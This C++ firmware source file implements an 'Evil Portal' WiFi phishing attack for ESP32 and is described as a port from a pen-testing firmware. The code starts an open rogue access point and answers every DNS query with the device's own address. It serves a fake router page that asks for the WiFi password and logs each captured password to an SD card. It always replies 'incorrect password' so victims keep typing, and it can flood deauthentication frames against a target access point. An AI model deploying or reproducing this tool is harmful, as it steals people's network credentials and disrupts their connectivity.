// ╔══════════════════════════════════════════════════════════════════════════╗
// ║  Bruce Evil Portal — Full Implementation                                  ║
// ║  Ported from Bruce Firmware v1.14  (Apache 2.0)                          ║
// ╚══════════════════════════════════════════════════════════════════════════╝
#include "bruce_evil_portal.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_netif.h"
#include "esp_event.h"
#include "esp_log.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <stdio.h>
#include <string.h>
#include <string>
#include <algorithm>

static const char* TAG = "EvilPortal";
EvilPortal* EvilPortal::s_instance = nullptr;

// ── Default portal HTML — convincing WiFi reconnection page ───────────────
std::string EvilPortal::defaultPortalHtml(const std::string& ssid)
{
    // Minimal but convincing portal — looks like router login page
    return std::string(
R"(<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:Arial,sans-serif;background:#f0f0f0;display:flex;
       justify-content:center;align-items:center;min-height:100vh}
  .card{background:#fff;padding:32px;border-radius:8px;box-shadow:0 2px 16px rgba(0,0,0,.15);
        width:340px;max-width:95vw}
  .logo{text-align:center;margin-bottom:24px}
  .logo svg{width:48px;height:48px}
  h2{font-size:1.1rem;color:#333;margin-bottom:6px;text-align:center}
  p{font-size:.85rem;color:#666;text-align:center;margin-bottom:20px}
  label{font-size:.85rem;color:#444;display:block;margin-bottom:4px}
  input{width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:4px;
        font-size:.95rem;margin-bottom:14px;outline:none}
  input:focus{border-color:#2196F3}
  button{width:100%;padding:12px;background:#2196F3;color:#fff;border:none;
         border-radius:4px;font-size:1rem;cursor:pointer;font-weight:bold}
  button:hover{background:#1976D2}
  .err{color:#e53935;font-size:.8rem;text-align:center;margin-top:8px;display:none}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 24 24" fill="#2196F3">
      <path d="M1 9l2 2c5.11-5.11 13.39-5.11 18.5 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3a4.237 4.237 0 00-6 0zm-4-4l2 2a7.074 7.074 0 0110 0l2-2C15.14 9.14 8.87 9.14 5 13z"/>
    </svg>
  </div>
  <h2>)") + ssid + R"( — Sign In</h2>
  <p>Your session has expired. Please enter your WiFi password to reconnect.</p>
  <form method="POST" action="/post">
    <label>Network</label>
    <input type="text" name="ssid" value=")" + ssid + R"(" readonly>
    <label>Password</label>
    <input type="password" name="pwd" placeholder="WiFi password" required autofocus>
    <button type="submit">Connect</button>
    <div class="err" id="err">Incorrect password. Please try again.</div>
  </form>
</div>
</body>
</html>)";
}

// ── Start ──────────────────────────────────────────────────────────────────
bool EvilPortal::start(const Config& cfg, CredentialCb onCred)
{
    if (m_running) stop();
    s_instance     = this;
    m_cfg          = cfg;
    m_onCred       = onCred;
    m_capturedCount= 0;
    m_creds.clear();

    // Load custom HTML from SD if specified
    if (!cfg.htmlFile.empty()) {
        FILE* f = fopen(cfg.htmlFile.c_str(), "r");
        if (f) {
            fseek(f, 0, SEEK_END); size_t sz = ftell(f); fseek(f, 0, SEEK_SET);
            m_portalHtml.resize(sz);
            fread(&m_portalHtml[0], 1, sz, f);
            fclose(f);
            ESP_LOGI(TAG, "Loaded custom HTML from %s (%zu bytes)", cfg.htmlFile.c_str(), sz);
        } else {
            ESP_LOGW(TAG, "Custom HTML not found, using default");
            m_portalHtml = defaultPortalHtml(cfg.apSsid);
        }
    } else {
        m_portalHtml = defaultPortalHtml(cfg.apSsid);
    }

    if (!startAP())         { stop(); return false; }
    if (!startDnsServer())  { stop(); return false; }
    if (!startHttpServer()) { stop(); return false; }

    // Optional deauth task against target AP
    if (cfg.deauthTarget) {
        xTaskCreatePinnedToCore(deauthTask,"ep_deauth",4096,this,4,&m_deauthTask,0);
    }

    m_running = true;
    ESP_LOGI(TAG, "Evil Portal running: SSID='%s' ch=%d", cfg.apSsid.c_str(), cfg.channel);
    return true;
}

// ── AP Setup ───────────────────────────────────────────────────────────────
bool EvilPortal::startAP()
{
    esp_netif_init();
    esp_event_loop_create_default();
    esp_netif_t* apNetif = esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_AP);

    wifi_config_t ap_cfg = {};
    memcpy(ap_cfg.ap.ssid, m_cfg.apSsid.c_str(),
           std::min(m_cfg.apSsid.size(), (size_t)32));
    ap_cfg.ap.ssid_len        = m_cfg.apSsid.size();
    ap_cfg.ap.channel         = m_cfg.channel;
    ap_cfg.ap.authmode        = WIFI_AUTH_OPEN;  // open — no password needed
    ap_cfg.ap.max_connection  = 8;
    ap_cfg.ap.beacon_interval = 100;

    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
    esp_wifi_start();

    // Set static IP 192.168.4.1
    esp_netif_ip_info_t ipInfo;
    IP4_ADDR(&ipInfo.ip,      192,168,4,1);
    IP4_ADDR(&ipInfo.gw,      192,168,4,1);
    IP4_ADDR(&ipInfo.netmask, 255,255,255,0);
    esp_netif_dhcps_stop(apNetif);
    esp_netif_set_ip_info(apNetif, &ipInfo);
    esp_netif_dhcps_start(apNetif);

    ESP_LOGI(TAG, "AP started: %s @ 192.168.4.1 ch%d", m_cfg.apSsid.c_str(), m_cfg.channel);
    return true;
}

// ── DNS Hijack ─────────────────────────────────────────────────────────────
// Binds to UDP port 53, answers EVERY query with 192.168.4.1
// This forces all domains → our portal (captive portal detection + real URLs)
void EvilPortal::dnsTask(void* arg)
{
    EvilPortal* self = (EvilPortal*)arg;

    self->m_dnsSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (self->m_dnsSock < 0) { vTaskDelete(nullptr); return; }

    struct sockaddr_in addr = {};
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port        = htons(53);
    bind(self->m_dnsSock, (struct sockaddr*)&addr, sizeof(addr));

    uint8_t  buf[512];
    uint8_t  resp[512];
    struct sockaddr_in client = {};
    socklen_t clen = sizeof(client);

    // Portal IP = 192.168.4.1
    const uint8_t portalIP[4] = {192, 168, 4, 1};

    while (self->m_running || self->m_dnsSock >= 0) {
        // Non-blocking receive
        struct timeval tv = {0, 200000}; // 200ms timeout
        fd_set fds; FD_ZERO(&fds); FD_SET(self->m_dnsSock, &fds);
        if (select(self->m_dnsSock+1, &fds, nullptr, nullptr, &tv) <= 0) continue;

        int len = recvfrom(self->m_dnsSock, buf, sizeof(buf), 0,
                           (struct sockaddr*)&client, &clen);
        if (len <= 0) continue;

        // Build DNS response: copy query header, set QR=1 AA=1 RA=1, append answer A record
        memcpy(resp, buf, len);
        resp[2] = 0x81; // QR=1, AA=1, RD=0
        resp[3] = 0x80; // RA=1, RCODE=0 (no error)
        // Answer count = 1
        resp[6] = 0x00; resp[7] = 0x01;
        // Append answer after question section
        int qend = 12;
        // Skip question name (find 0x00 terminator)
        while (qend < len && buf[qend] != 0x00) {
            if ((buf[qend] & 0xC0) == 0xC0) { qend += 2; break; }
            qend += buf[qend] + 1;
        }
        if (buf[qend] == 0x00) qend++;
        qend += 4; // skip QTYPE + QCLASS

        // Append A record answer
        int rlen = qend;
        resp[rlen++] = 0xC0; resp[rlen++] = 0x0C; // pointer to question name
        resp[rlen++] = 0x00; resp[rlen++] = 0x01; // type A
        resp[rlen++] = 0x00; resp[rlen++] = 0x01; // class IN
        resp[rlen++] = 0x00; resp[rlen++] = 0x00; // TTL
        resp[rlen++] = 0x00; resp[rlen++] = 0x04; // TTL (4 sec)
        resp[rlen++] = 0x00; resp[rlen++] = 0x04; // RDLENGTH = 4
        resp[rlen++] = portalIP[0]; resp[rlen++] = portalIP[1];
        resp[rlen++] = portalIP[2]; resp[rlen++] = portalIP[3];

        sendto(self->m_dnsSock, resp, rlen, 0,
               (struct sockaddr*)&client, clen);
    }
    close(self->m_dnsSock);
    self->m_dnsSock = -1;
    vTaskDelete(nullptr);
}

bool EvilPortal::startDnsServer()
{
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        ESP_LOGE(TAG, "DNS socket failed");
        return false;
    }
    struct sockaddr_in addr = {};
    addr.sin_family = AF_INET; addr.sin_port = htons(53);
    addr.sin_addr.s_addr = INADDR_ANY;
    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        ESP_LOGE(TAG, "DNS bind failed (need root/CAP_NET_BIND_SERVICE)");
        close(sock);
        // DNS bind can fail if port 53 is busy — portal still works via HTTP redirect
        return true;
    }
    close(sock); // dnsTask opens its own socket

    xTaskCreatePinnedToCore(dnsTask, "ep_dns", 4096, this, 5, &m_dnsTask, 0);
    return true;
}

// ── HTTP Server ────────────────────────────────────────────────────────────
bool EvilPortal::startHttpServer()
{
    httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();
    cfg.server_port         = 80;
    cfg.max_uri_handlers    = 8;
    cfg.stack_size          = 8192;
    cfg.uri_match_fn        = httpd_uri_match_wildcard;
    cfg.lru_purge_enable    = true;

    if (httpd_start(&m_server, &cfg) != ESP_OK) {
        ESP_LOGE(TAG, "httpd_start failed");
        return false;
    }

    // Register handlers
    httpd_uri_t rootUri    = {"/",        HTTP_GET,  handlerRoot,    nullptr};
    httpd_uri_t postUri    = {"/post",    HTTP_POST, handlerPost,    nullptr};
    httpd_uri_t faviconUri = {"/favicon.ico",HTTP_GET,handlerFavicon,nullptr};
    httpd_uri_t catchUri   = {"/*",       HTTP_GET,  handlerCatch,   nullptr};

    httpd_register_uri_handler(m_server, &rootUri);
    httpd_register_uri_handler(m_server, &postUri);
    httpd_register_uri_handler(m_server, &faviconUri);
    httpd_register_uri_handler(m_server, &catchUri);

    ESP_LOGI(TAG, "HTTP server started on port 80");
    return true;
}

esp_err_t EvilPortal::handlerRoot(httpd_req_t* r)
{
    if (!s_instance) return ESP_FAIL;
    httpd_resp_set_type(r, "text/html");
    httpd_resp_set_hdr(r, "Cache-Control", "no-cache");
    return httpd_resp_send(r, s_instance->m_portalHtml.c_str(),
                           s_instance->m_portalHtml.size());
}

esp_err_t EvilPortal::handlerPost(httpd_req_t* r)
{
    if (!s_instance) return ESP_FAIL;

    // Read POST body
    char body[512] = {};
    int len = std::min((int)r->content_len, (int)sizeof(body)-1);
    httpd_req_recv(r, body, len);
    body[len] = '\0';

    // Parse ssid=...&pwd=... URL-encoded form
    auto urlDecode = [](const char* s) -> std::string {
        std::string out;
        for (int i = 0; s[i]; i++) {
            if (s[i] == '+') { out += ' '; continue; }
            if (s[i] == '%' && s[i+1] && s[i+2]) {
                char hex[3] = {s[i+1], s[i+2], 0};
                out += (char)strtol(hex, nullptr, 16);
                i += 2;
            } else out += s[i];
        }
        return out;
    };

    auto getParam = [&](const char* key) -> std::string {
        std::string k = std::string(key) + "=";
        const char* p = strstr(body, k.c_str());
        if (!p) return "";
        p += k.size();
        const char* end = strchr(p, '&');
        std::string val = end ? std::string(p, end-p) : std::string(p);
        return urlDecode(val.c_str());
    };

    std::string ssid = getParam("ssid");
    std::string pwd  = getParam("pwd");

    // Get client MAC from socket (best effort)
    std::string mac = "unknown";
    int sock = httpd_req_to_sockfd(r);
    struct sockaddr_in6 addr = {};
    socklen_t addrlen = sizeof(addr);
    if (getpeername(sock, (struct sockaddr*)&addr, &addrlen) == 0) {
        // Try to find MAC in ARP table (limited on ESP)
        char ipstr[64] = {};
        inet_ntop(addr.sin6_family == AF_INET ? AF_INET : AF_INET6,
                  &addr.sin6_addr, ipstr, sizeof(ipstr));
        mac = std::string(ipstr);
    }

    if (!pwd.empty()) {
        s_instance->logCredential(ssid, pwd, mac);
        // Return "wrong password" page to keep victim entering
        const char* wrongPage = R"(<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title><style>body{font-family:Arial,sans-serif;background:#f0f0f0;
display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;padding:32px;border-radius:8px;box-shadow:0 2px 16px rgba(0,0,0,.15);width:340px}
.err{color:#e53935;font-size:.9rem;text-align:center;margin-bottom:16px}
input{width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;font-size:.95rem;margin-bottom:14px}
button{width:100%;padding:12px;background:#2196F3;color:#fff;border:none;border-radius:4px;font-size:1rem;font-weight:bold}
</style></head><body><div class="card">
<div class="err">⚠ Incorrect password. Please try again.</div>
<form method="POST" action="/post">
<input type="hidden" name="ssid" value=")" ;
        httpd_resp_set_type(r, "text/html");
        httpd_resp_send_chunk(r, wrongPage, strlen(wrongPage));
        httpd_resp_send_chunk(r, ssid.c_str(), ssid.size());
        const char* tail = R"(">
<input type="password" name="pwd" placeholder="WiFi password" required autofocus>
<button type="submit">Connect</button>
</form></div></body></html>)";
        httpd_resp_send_chunk(r, tail, strlen(tail));
        return httpd_resp_send_chunk(r, nullptr, 0);
    }

    // No password submitted — redirect back to portal
    httpd_resp_set_status(r, "302 Found");
    httpd_resp_set_hdr(r, "Location", "/");
    return httpd_resp_send(r, nullptr, 0);
}

esp_err_t EvilPortal::handlerFavicon(httpd_req_t* r)
{
    // Tiny 1×1 transparent GIF
    static const uint8_t gif[] = {
        0x47,0x49,0x46,0x38,0x39,0x61,0x01,0x00,0x01,0x00,
        0x00,0xFF,0x00,0x2C,0x00,0x00,0x00,0x00,0x01,0x00,
        0x01,0x00,0x00,0x02,0x00,0x3B
    };
    httpd_resp_set_type(r, "image/gif");
    return httpd_resp_send(r, (const char*)gif, sizeof(gif));
}

// Catch-all: redirect everything back to portal (captive portal detection)
esp_err_t EvilPortal::handlerCatch(httpd_req_t* r)
{
    httpd_resp_set_status(r, "302 Found");
    httpd_resp_set_hdr(r, "Location", "http://192.168.4.1/");
    return httpd_resp_send(r, nullptr, 0);
}

// ── Credential logging ─────────────────────────────────────────────────────
void EvilPortal::logCredential(const std::string& ssid,
                                const std::string& pwd,
                                const std::string& mac)
{
    m_capturedCount++;
    std::string entry = ssid + ":" + pwd + " [" + mac + "]";
    m_creds.push_back(entry);
    ESP_LOGI(TAG, "CAPTURED #%d: ssid='%s' pwd='%s' from %s",
             m_capturedCount, ssid.c_str(), pwd.c_str(), mac.c_str());

    // Append to SD file
    FILE* f = fopen(m_cfg.credFile.c_str(), "a");
    if (f) {
        fprintf(f, "%s\n", entry.c_str());
        fclose(f);
    }

    if (m_onCred) m_onCred(ssid, pwd, mac);
}

// ── Deauth on target AP (forces clients to disconnect and join our portal) ─
void EvilPortal::deauthTask(void* arg)
{
    EvilPortal* self = (EvilPortal*)arg;
    static const uint8_t deauthFrame[] = {
        0xC0,0x00,0x3A,0x01,
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF, // dst: broadcast
        0x00,0x00,0x00,0x00,0x00,0x00, // src: filled with target BSSID
        0x00,0x00,0x00,0x00,0x00,0x00, // bssid: filled with target BSSID
        0x00,0x00,
        0x07,0x00   // reason: class 3 frame from non-associated STA
    };
    uint8_t frame[sizeof(deauthFrame)];
    memcpy(frame, deauthFrame, sizeof(deauthFrame));
    memcpy(frame+10, self->m_cfg.targetBssid, 6);
    memcpy(frame+16, self->m_cfg.targetBssid, 6);

    esp_wifi_set_promiscuous(true);
    while (self->m_running) {
        // Randomise sender MAC each burst
        frame[6] = esp_random()&0xFF; frame[7] = esp_random()&0xFF;
        for (int i = 0; i < 5; i++) {
            esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    esp_wifi_set_promiscuous(false);
    vTaskDelete(nullptr);
}

// ── Stop ───────────────────────────────────────────────────────────────────
void EvilPortal::stop()
{
    m_running = false;

    if (m_deauthTask) { vTaskDelay(pdMS_TO_TICKS(50)); m_deauthTask = nullptr; }
    if (m_dnsTask)    { vTaskDelay(pdMS_TO_TICKS(300)); m_dnsTask = nullptr; }

    if (m_server) {
        httpd_stop(m_server);
        m_server = nullptr;
    }
    if (m_dnsSock >= 0) {
        close(m_dnsSock);
        m_dnsSock = -1;
    }

    esp_wifi_stop();
    esp_wifi_deinit();
    ESP_LOGI(TAG, "Evil Portal stopped. Captured %d credential(s).", m_capturedCount);
}
